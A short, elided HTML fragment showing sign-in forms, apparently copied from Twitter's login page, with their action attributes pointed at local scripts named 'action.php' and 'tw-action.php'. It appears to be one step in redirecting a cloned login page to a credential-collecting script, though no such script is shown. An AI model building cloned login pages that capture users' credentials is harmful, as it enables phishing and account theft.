...
<form action="action.php" class="LoginForm js-front-signin" method="post"
...
>
  ...
  <div class="signin-wrapper" data-login-message="">
    ...
    <form action="tw-action.php" class="t1-form clearfix signin js-signin" method="post">
      <fieldset>
...
<form action="tw-action.php" class="LoginForm js-front-signin" method="post"
